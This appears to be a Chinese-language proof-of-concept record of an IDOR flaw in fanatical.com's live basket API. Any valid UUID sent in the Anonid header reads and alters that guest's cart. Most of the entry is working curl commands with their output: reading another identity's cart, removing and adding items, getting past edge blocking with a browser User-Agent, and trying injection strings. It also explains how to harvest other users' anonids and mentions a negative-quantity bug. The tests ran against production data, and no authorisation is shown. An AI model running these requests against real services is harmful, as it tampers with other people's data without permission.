# Fanatical（www.fanatical.com）/api/basket 以客户端可控 Anonid 请求头为唯一身份，无属主校验可跨身份读/改他人游客购物车

- **code**: fanatical-api-basket-anonid-cross-identity-readwrite
- **kind**: poc
- **category**: unauthorized
- **component**: Fanatical 主站购物车 API（www.fanatical.com/api/basket，Heroku/Express 后端 + Cloudflare Worker 前端）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 15:0x UTC，本机 curl / python-requests 经记录代理直连 https://www.fanatical.com/api/basket 实测：① GET /api/basket 仅带 Anonid: 11111111-1111-4111-8111-111111111111、无任何 Authorization → HTTP/2 200（len=3262），返回一个本人从未创建的两件商品购物车 [{"pid":"6ad8996f54da982291d52c59","name":"Asynchronous Programming in Python","quantity":1,...},{"pid":"6ad74df030aff9d3b7048db1","name":"Feed The Pit",...}]；② 对照：同 header 换任意随机 UUIDv4 → 200 body=[]（len=2），证明返回是按 Anonid 索引的既有状态而非固定/公共数据；③ 写入：PUT /api/basket {productId,tierIndex} → 200 且随后 GET 该商品从购物车消失（removeFromCart），POST /api/basket {productId,productSlug} → 200 且商品恢复，确认跨身份读+写；④ Anonid 被严格 UUID 校验：' OR '1'='1 / {"$ne":null} / $ne / 非 UUID → 400 {"err":"AnonId Header not valid"}，无注入放大；⑤ /api/user/* 一律 401 "Missing authorization header"。finding_checks.verdict=verified，findings.status=confirmed。
- **path**: pocs/fanatical-api-basket-anonid-cross-identity-readwrite/poc.md
- **tags**: fanatical,basket,anonid,idor,unauthorized,anonymous-cart,ecommerce,cross-identity,uuid,api
- **created_at**: 2026-11-11T15:23:51.922Z
- **engine**: https://www.fanatical.com/api/basket

## 描述

生产 API /api/basket 完全以请求头 Anonid（客户端可控 UUIDv4）作为购物车身份的唯一定位键，服务端不校验该身份归属/Authentication：任意取一个合法 UUIDv4 即可读取并改写该身份名下的购物车（跨身份 IDOR）。响应仅含商品目录字段（pid/name/quantity，无姓名/邮箱/地址等 PII），且真实用户 anonid 为随机 UUIDv4 不易猜测，故影响面受限定级 low；anonid 通过前端 ?set_anon_id=<uuid> 参数与 analytics/tag-manager 事件外泄，构成实际获取他人车 handle 的向量。

## 用法

```
前置：可直连 https://www.fanatical.com/api（本环境直连即可，无 CF 挑战），无需任何账号/令牌；必须使用浏览器类 User-Agent（裸 curl UA 会被边缘 403 "Request blocked"）；Anonid 头必须是合法 UUIDv4。

判据（四条互相对照缺一不可）：
① 无 Authorization、仅 Anonid: <某 UUID> → 200 且返回该 UUID 名下既有购物车（非本人创建）；
② 换随机 UUIDv4 → 200 body=[]（证明是按 Anonid 索引的既有状态，而非固定/公共数据）；
③ PUT/POST 同 Anonid → 200 且回读状态随之变化（证明可跨身份写）；
④ Anonid 非 UUID / 含注入字符 → 400 {"err":"AnonId Header not valid"}（证明严格 UUID 校验、无注入放大）。

# ① 读他人游客车（Anonid 用可猜解/泄露得到的 UUID）
curl -sk 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Accept: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111'
# → HTTP/2 200 len=3262，返回该身份名下的两件商品（非本人创建）

# ② 对照：随机 UUIDv4 → 空车
curl -sk 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Anonid: 7d354cd6-0000-4000-8000-000000000000'
# → HTTP/2 200 body=[] len=2

# ③ 写：PUT=从车中移除某件（removeFromCart）
curl -sk -X PUT 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Content-Type: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111' \
  -d '{"productId":"6ad8996f54da982291d52c59","tierIndex":0}'
# → HTTP/2 200；随后 GET 同 Anonid 该商品消失

# ③ 写：POST=加入购物车（addToCart）
curl -sk -X POST 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Content-Type: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111' \
  -d '{"productId":"6ad8996f54da982291d52c59","productSlug":"asynchronous-programming-in-python"}'
# → HTTP/2 200 len=3262，商品恢复

# ④ 注入/格式对照（均期望 400）
curl -sk 'https://www.fanatical.com/api/basket' -A "$UA" -H "Anonid: ' OR '1'='1"
# → HTTP/2 400 {"err":"AnonId Header not valid"}

关键结论：
- Anonid = 唯一身份键，服务端不做属主校验（无 session/token 绑定），因此「拿到一个 anonid 即可读改其车」。
- 泄露向量：前端支持 ?set_anon_id=<uuid> 参数，且 anonid 会写入第三方 analytics / tag-manager 事件 → 可被动收集他人 anonid。
- 影响边界：/api/basket 响应仅商品目录字段，不含 PII；/api/user/* 一律 401 "Missing authorization header"；真实用户 anonid 为随机 UUIDv4，不易枚举 → 定级 low。

失败常见原因：
- 用 curl 裸 UA（非浏览器 UA）→ 边缘 403 "Request blocked"，还没到业务层（见同站条目 538 / 547 的门禁说明）。
- Anonid 头缺省或格式非法（非 UUIDv4）→ 400 {"err":"AnonId Header not valid"}；注意必须作为请求头而非 query/body。
- 目标该 anonid 名下本就是空车 → 200 但 body=[]，须用「能读出非本人生成内容」+ 变更对照来确证，不要仅凭 200 判定。
```

## 正文

```
# Fanatical /api/basket 跨身份读/写他人游客购物车（Anonid 头即身份，无属主校验）

## 一句话
`https://www.fanatical.com/api/basket` 以请求头 `Anonid`（客户端可控的 UUIDv4）作为购物车身份的**唯一定位键**，
服务端既不要求 Authorization、也不校验该 Anonid 的归属。任意取一个合法 UUIDv4 即可 **读取并改写** 该身份名下的购物车
（跨身份 IDOR）。响应仅含商品目录字段（无 PII），真实用户 anonid 为随机 UUIDv4 不易猜，故定级 low。

## 前置条件
- 网络可直达 `https://www.fanatical.com/api`（本环境直连即可；静态与 `/api` 动态路径均未被 CF 挑战）。
- **无需要任何账号 / 令牌 / Cookie**。
- 必须携带**浏览器类 User-Agent**（裸 `curl/x.y.z` UA 会被边缘拦成 `403 Request blocked`，到不了业务层）。
- `Anonid` 头必须是**合法 UUIDv4**。

## 判据（四条对照实验，缺一不可）
| # | 操作 | 期望 | 说明 |
|---|------|------|------|
| 1 | 无 Authorization，仅 `Anonid: <某 UUID>` GET | 200，返回该 UUID 名下**既有**购物车 | 读出非本人创建的内容 = 跨身份读 |
| 2 | 换随机 UUIDv4 GET | 200，`body=[]` | 证明返回是「按 Anonid 索引的既有状态」，非固定/公共数据 |
| 3 | 同 Anonid PUT / POST | 200，且回读状态随之变化 | 证明可跨身份**写**（移除/加入购物车） |
| 4 | Anonid 非 UUID / 含注入字符 | 400 `{"err":"AnonId Header not valid"}` | 证明严格 UUID 校验，无 NoSQL/SQL 注入放大 |

## 请求 / 命令

```bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

# ① 读：他人 Anonid 的购物车（此 UUID 为可猜解样本）
curl -sk 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Accept: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111'
# → HTTP/2 200  content-length: 3262
# body=[{"pid":"6ad8996f54da982291d52c59","name":"Asynchronous Programming in Python","quantity":1,...},
#       {"pid":"6ad74df030aff9d3b7048db1","name":"Feed The Pit","quantity":1,...}]
# 注意：这不是本人创建的购物车

# ② 对照：随机 UUIDv4 → 空车
curl -sk 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Anonid: 7d354cd6-0000-4000-8000-000000000000'
# → HTTP/2 200  body=[]  (len=2)

# ③ 写：PUT = 从车中移除（removeFromCart）
curl -sk -X PUT 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Content-Type: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111' \
  -d '{"productId":"6ad8996f54da982291d52c59","tierIndex":0}'
# → HTTP/2 200；随后 GET 同 Anonid，该商品已消失（只剩 feed-the-pit）

# ③ 写：POST = 加入购物车（addToCart）
curl -sk -X POST 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Content-Type: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111' \
  -d '{"productId":"6ad8996f54da982291d52c59","productSlug":"asynchronous-programming-in-python"}'
# → HTTP/2 200  len=3262；GET 同 Anonid，恢复为两件

# ④ 注入 / 格式对照（期望 400）
curl -sk 'https://www.fanatical.com/api/basket' -A "$UA" -H "Anonid: ' OR '1'='1"
curl -sk 'https://www.fanatical.com/api/basket' -A "$UA" -H 'Anonid: {"$ne":null}'
curl -sk 'https://www.fanatical.com/api/basket' -A "$UA" -H 'Anonid: 11111111-1111-4111-8111-11111111111'
# → 全部 HTTP/2 400  body={"err":"AnonId Header not valid"}
```

## 原理与影响边界
- **身份模型缺陷**：`Anonid` 既是「我」的标识，也是「我要操作的车」的定位键，二者未做绑定；
  服务端没有 session/token 把 Anonid 绑到调用方，等于把身份交到客户端手里。
- **泄露向量**：前端支持 `?set_anon_id=<uuid>` 参数；anonid 还会被写入第三方 analytics / tag-manager 事件，
  使攻击者可被动收集他人 anonid（这是把「不可猜」变成「可获取」的关键）。
- **影响有限（故 low）**：
  - `/api/basket` 响应仅含商品目录字段（pid/name/slug/quantity），**无姓名/邮箱/地址等 PII**；
  - 真实用户的 anonid 为随机 UUIDv4，不易枚举；
  - `/api/user/*` 一律 `401 "Missing authorization header"`，落不到账户层。
  - 可造成的实际效果：跨身份读他人选品、往他人车里增删商品（篡改/骚扰）。

## 失败常见原因
- **UA 不对**：用了 `curl/8.x` 之类非浏览器 UA → 边缘直接 `403 Request blocked`（15 字节），根本没到后端。
- **Anonid 缺省或非法**：非 UUIDv4 → `400 {"err":"AnonId Header not valid"}`；且必须是**请求头**，
  写进 query/body 无效。
- **空车误判**：目标 anonid 名下本来就没东西 → `200` 但 `body=[]`；必须用「读出非本人生成内容」+「写后回读变更」来确证，别只看 200。

## 关联
- 同站入口门禁（400 "Request blocked" 的成因与绕过，anonid 头必须存在）见 kb 条目 `fanatical-api-request-blocked-gate-bypass-anonid-header` 与 `fanatical-api-真实入口门是-anonid-uuidv4-头而非-x-fan-fp-403-reques`。
- 另注：`POST /api/basket` 亦未校验 `quantity` 下限（`quantity:-5` 可持久化），但下单强制认证，匿名态无法闭合真实影响，仅作线索。

```
